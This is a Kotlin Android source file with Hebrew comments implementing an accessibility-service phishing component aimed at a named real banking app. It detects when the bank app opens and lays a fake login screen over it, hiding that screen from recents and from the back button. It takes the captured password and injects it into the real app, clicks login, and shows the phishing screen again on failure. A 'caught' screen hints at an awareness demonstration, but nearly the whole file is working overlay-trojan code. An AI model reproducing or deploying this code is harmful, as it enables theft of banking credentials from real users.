package com.example.phishingframework

import android.accessibilityservice.AccessibilityService
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityNodeInfo
import androidx.core.content.ContextCompat

//מטרת המחלקה:
//לזהות את פתיחת אפליקציית המטרה = הבנק (com.ideomobile.mercantile)
//להציג מסך התחזות מעל האפליקציה האמיתית
//להזריק אוטומטית את הסיסמה שנלכדה חזרה לאפליקציה האמיתית
//לטפל בכשלי התחברות ולהציג שוב את מסך הפישינג
class PhishingAccessibilityService : AccessibilityService() {
    companion object {
        private const val TAG = "PhishingService"
        private const val TARGET_PACKAGE = "com.ideomobile.mercantile"
        private const val ACTION_INJECT_PASSWORD = "com.example.phishingframework.ACTION_INJECT_PASSWORD"
    }

    private val handler = Handler(Looper.getMainLooper())

    // משתנה פשוט שמונע הצגה כפולה
    private var overlayShown = false

    // משתנה שמסמן שהמשתמש כבר התחבר
    private var userLoggedIn = false

    // זמן אחרון שהצגנו overlay - למניעת הצגות כפולות
    private var lastOverlayShowTime = 0L

    // מעקב אחרי ניסיון התחברות
    private var loginAttemptTime = 0L

    // לשמירת הסיסמה להזרקה
    private var injectedPassword: String = ""
    private lateinit var injectorReceiver: BroadcastReceiver

    // משתנים חדשים לזיהוי התנתקות
    private var wasLoggedInSuccessfully = false
    private var showingCaughtScreen = false

    //מטרה: נקראת כשהשירות מתחבר למערכת האנדרואיד
    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.i(TAG, "Service Connected")

        // רישום receiver לקבלת סיסמה
        injectorReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context, intent: Intent) {
                injectedPassword = intent.getStringExtra("password") ?: ""
                Log.i(TAG, "Received password for injection")

                // מסמנים שאנחנו בתהליך התחברות מחדש
                overlayShown = false
                userLoggedIn = true  // מונע הצגת overlay נוסף

                // אחרי קבלת הסיסמה, נזריק אותה אוטומטית
                if (injectedPassword.isNotEmpty()) {
                    handler.postDelayed({
                        injectPasswordToRealApp()
                    }, 1000)  // המתנה ארוכה יותר כדי לתת למסך להיטען
                }
            }
        }

        //IntentFilter הוא "מסנן" שקובע איזה סוג הודעות ה-Receiver יאזין להן
        //כאן אנחנו אומרים: "תאזין רק להודעות מסוג ACTION_INJECT_PASSWORD"
        // האובייקט שיטפל בהודעות כשהן מגיעות - נמצא בתחילת הפונקציה.
        val filter = IntentFilter(ACTION_INJECT_PASSWORD)
        ContextCompat.registerReceiver(
            this,
            injectorReceiver,
            filter,
            ContextCompat.RECEIVER_NOT_EXPORTED
        )
    }

    //מטרה: נקראת בכל פעם שקורה אירוע נגישות במערכת
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return

        // מסננים רק אירועי שינוי חלון
        //ללא הסינון הזה, מסך הפישינג היה מופיע עשרות פעמים ברגע, בכל לחיצה קטנה של המשתמש
        //TYPE_WINDOW_STATE_CHANGED - כולל בתוכו פתיחת אפליקציה חדשה,מעבר בין אפליקציות, חזרה למסך הבית, פתיחת דיאלוג/פופ-אפ
        if (event.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return

        val pkg = event.packageName?.toString() ?: return
        Log.i(TAG, "Window changed to: $pkg")

        // מתעלמים מהאפליקציה שלנו
        if (pkg == packageName) return

        // מתעלמים מ-SystemUI ומקלדות
        val ignoredPackages = setOf(
            "com.android.systemui",
            "com.samsung.android.honeyboard",
            "com.google.android.inputmethod.latin",
            "com.android.inputmethod.latin"
        )
        if (pkg in ignoredPackages) return

        // הלוגיקה הפשוטה:
        when (pkg) {
            TARGET_PACKAGE -> {
                // בדיקה האם זה מסך ההתחברות אחרי התחברות מוצלחת
                if (wasLoggedInSuccessfully && !showingCaughtScreen) {
                    // בודקים אם זה מסך ההתחברות
                    handler.postDelayed({
                        checkIfBackToLoginScreen()
                    }, 1000) // מחכים שנייה שהמסך יטען לחלוטין
                    return
                }

                // בדיקה שעברו לפחות 2 שניות מההצגה האחרונה
                val currentTime = System.currentTimeMillis()
                if (currentTime - lastOverlayShowTime < 1000) {
                    Log.i(TAG, "Ignoring duplicate event - too soon")
                    return
                }

                // אם האפליקציה האמיתית נפתחת ועוד לא הצגנו overlay ולא התחברנו
                if (!overlayShown && !userLoggedIn) {
                    overlayShown = true
                    lastOverlayShowTime = currentTime

                    // נוסיף השהייה קטנה כדי לתת למערכת להתייצב
                    handler.postDelayed({
                        showPhishingOverlay()
                    }, 100)
                } else if (userLoggedIn && loginAttemptTime > 0) {
                    // אם ניסינו להתחבר, נבדוק אם נכשלנו
                    if (currentTime - loginAttemptTime > 2000) {
                        checkForLoginFailure()
                    }
                }
            }

            "com.sec.android.app.launcher" -> {
                // חזרה ל-Home - מאפסים את המצב
                resetState()
            }

            else -> {
                // כל אפליקציה אחרת - מאפסים את המצב
                if (pkg != packageName) {
                    resetState()
                }
            }
        }
    }

    private fun resetState() {
        overlayShown = false
        userLoggedIn = false
        loginAttemptTime = 0L
        injectedPassword = ""
        wasLoggedInSuccessfully = false
        showingCaughtScreen = false
    }

    private fun checkIfBackToLoginScreen() {
        val root = rootInActiveWindow ?: return

        // בודקים אם רואים את כפתור ההתחברות - סימן שחזרנו למסך התחברות
        val loginButtons = root.findAccessibilityNodeInfosByViewId(
            "com.ideomobile.mercantile:id/LoginButton"
        )

        if (loginButtons.isNotEmpty()) {
            Log.i(TAG, "User logged out and back to login screen - showing caught screen")
            showingCaughtScreen = true

            // אחרי 3 שניות מהתחברות מוצלחת, מציגים את מסך "נפלת בפח"
            handler.postDelayed({
                showCaughtScreen()
            }, 3000)
        }
    }

    private fun showCaughtScreen() {
        Log.i(TAG, "Showing 'caught' screen")

        val intent = Intent(this, CaughtActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
            addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
            addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
        }
        startActivity(intent)
    }

    //פתיחת מסך הפישינג המזויף מעל אפליקציית הבנק האמיתית
    private fun showPhishingOverlay() {
        Log.i(TAG, "Showing phishing overlay")

        val intent = Intent(this, PhishingOverlayActivity::class.java).apply {
            //יוצר "משימה" (Task) חדשה במערכת, מאפשר לפתוח Activity מתוך Service (בלי זה לא עובד!)
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            //מוחק את כל ה-Activities הקיימים במשימה, הופך את מסך הפישינג לאחד ויחיד במחסנית- מבטיח שהמשתמש לא יוכל ללחוץ "חזור" ולחזור לאפליקציית הבנק האמיתית
            addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
            //אם מסך הפישינג כבר קיים, לא יוצר עוד אחד,מונע כפילויות של אותו מסך
            addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
            //מסתיר את מסך הפישינג מרשימת האפליקציות האחרונות, כשהמשתמש לוחץ על כפתור "אפליקציות אחרונות" - הוא לא רואה את מסך הפישינג
            addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
        }
        startActivity(intent)
    }

    private fun showPhishingOverlay(errorMessage: String? = null) {
        Log.i(TAG, "Showing phishing overlay" + if (errorMessage != null) " with error: $errorMessage" else "")

        val intent = Intent(this, PhishingOverlayActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
            addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
            addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)

            // מעבירים הודעת שגיאה אם יש
            errorMessage?.let {
                putExtra("error_message", it)
            }
        }
        startActivity(intent)
    }

    //לזהות אם הסיסמה שהוזרקה לאפליקציית הבנק האמיתית הייתה נכונה או שגויה, ולהגיב בהתאם
    private fun checkForLoginFailure() {
        val root = rootInActiveWindow ?: return

        // בודקים אם עדיין רואים את כפתור הכניסה - סימן שלא התחברנו
        val loginButtons = root.findAccessibilityNodeInfosByViewId(
            "com.ideomobile.mercantile:id/LoginButton"
        )

        if (loginButtons.isNotEmpty()) {
            Log.i(TAG, "Login failed - still on login screen")

            // מאפסים את המצב
            overlayShown = false
            userLoggedIn = false
            loginAttemptTime = 0L

            // מציגים שוב את ה-overlay עם הודעת שגיאה
            handler.postDelayed({
                showPhishingOverlay("הסיסמה שהזנת שגויה, אנא נסה שוב")
            }, 500)
        } else {
            // התחברנו בהצלחה - מאפסים את זמן הניסיון
            loginAttemptTime = 0L
            wasLoggedInSuccessfully = true
            Log.i(TAG, "Login successful - marking for later detection")
        }
    }

    //אחראית על הזרקת הסיסמה שנלכדה למסך ההתחברות האמיתי של הבנק.
    private fun injectPasswordToRealApp() {
        Log.i(TAG, "Attempting to inject password")

        //rootInActiveWindow מחזיר את השורש של החלון הפעיל כרגע
        val root = rootInActiveWindow
        if (root == null) {
            Log.w(TAG, "No root window available")
            return
        }

        // מחפשים את שדה הסיסמה
        //כל רכיב בממשק אנדרואיד יכול לקבל מזהה יחודי
        //text_input_edit_text_layout = שם הרכיב של שדה הסיסמה
        val passwordNodes = root.findAccessibilityNodeInfosByViewId(
            "com.ideomobile.mercantile:id/text_input_edit_text_layout"
        )

        if (passwordNodes.isEmpty()) {
            Log.w(TAG, "Password field not found")
            return
        }

        val passwordNode = passwordNodes[0]

        // פעולה שנותנת "פוקוס" לרכיב (כמו לחיצה עליו)
        //מערכת האנדרואיד מאפשרת הזנת טקסט רק לרכיב שיש לו פוקוס
        passwordNode.performAction(AccessibilityNodeInfo.ACTION_FOCUS)

        // הזנת הסיסמה
        //קבוע שמגדיר שהפרמטר הוא "טקסט שרוצים להזין" -ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE
        //אנדרואיד יודע שהערך הזה צריך להיכנס לשדה הטקסט
        val arguments = android.os.Bundle()
        arguments.putCharSequence(
            AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
            injectedPassword
        )
        //פעולת נגישות שמזינה טקסט לרכיב
        //דומה לכתיבה במקלדת, אבל ישירות
        passwordNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)

        Log.i(TAG, "Password injected successfully")

        // לחיצה על כפתור הכניסה
        handler.postDelayed({
            val loginButtons = root.findAccessibilityNodeInfosByViewId(
                "com.ideomobile.mercantile:id/LoginButton"
            )
            if (loginButtons.isNotEmpty()) {
                loginButtons[0].performAction(AccessibilityNodeInfo.ACTION_CLICK)
                Log.i(TAG, "Login button clicked")

                // מסמנים שהמשתמש התחבר וזמן הניסיון
                userLoggedIn = true
                loginAttemptTime = System.currentTimeMillis()
            }
        }, 300)

        // איפוס המצב לאחר ההזרקה
        overlayShown = false
        injectedPassword = ""
    }

    override fun onInterrupt() {
        Log.i(TAG, "Service interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            unregisterReceiver(injectorReceiver)
        } catch (e: Exception) {
            Log.e(TAG, "Error unregistering receiver", e)
        }
    }
}